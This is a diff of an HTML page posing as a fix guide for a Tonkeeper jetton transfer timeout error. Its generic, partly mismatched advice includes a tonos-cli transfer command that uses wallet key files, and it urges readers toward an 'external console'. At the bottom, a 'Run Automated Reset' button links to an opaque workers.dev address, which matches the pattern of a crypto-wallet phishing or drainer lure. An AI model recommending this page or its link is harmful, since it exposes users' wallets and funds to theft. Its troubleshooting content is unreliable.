@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,28 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a timeout error when attempting to transfer Tonkeeper Jettons, resulting in a failed transaction and an error message indicating a transfer loop timeout.</li>
+<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary network congestion or a high load on the TON blockchain, causing the transfer operation to exceed the maximum allowed time, thus timing out.</li>
+<li>The error occurs due to a prolonged loop in the transfer process, often caused by network congestion, insufficient gas, or incorrect configuration of the Tonkeeper wallet.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, the user can try the following manual overrides:</li>
-<li>Increase the transaction timeout threshold to allow for more time to complete the transfer.</li>
-<li>Reduce the number of concurrent transactions to alleviate network congestion.</li>
-<li>Implement a retry mechanism with exponential backoff to handle temporary timeouts.</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the gas limit for the transaction</li>
+<li>Verify the recipient's wallet address and ensure it is correct</li>
+<li>Restart the Tonkeeper application and retry the transfer</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;backoff_factor&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>-s<span class="w"> </span>/path/to/wallet.json<span class="w"> </span>--abi<span class="w"> </span>/path/to/abi.json<span class="w"> </span>--func<span class="w"> </span>transfer<span class="w"> </span>--sign<span class="w"> </span>--key<span class="w"> </span>/path/to/key.json<span class="w"> </span>--params<span class="w"> </span><span class="s1">&#39;[&quot;recipient_address&quot;, &quot;amount&quot;]&#39;</span>
 </code></pre></div>
 
-<p>Consider using an external console to execute these commands for better control over the process. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Basic understanding of TON blockchain and Tonkeeper wallet functionality</li>
-<li>Access to the Tonkeeper wallet API or console</li>
-<li>Familiarity with JSON configuration files and transaction management</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li></ul>
+<p>Prerequisites:
+* Tonos-cli installed and configured
+* Valid wallet and key files
+* Correct ABI file for the Tonkeeper contract</p>
+<p>Consider utilizing an external console to execute the manual overrides for a more seamless experience.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
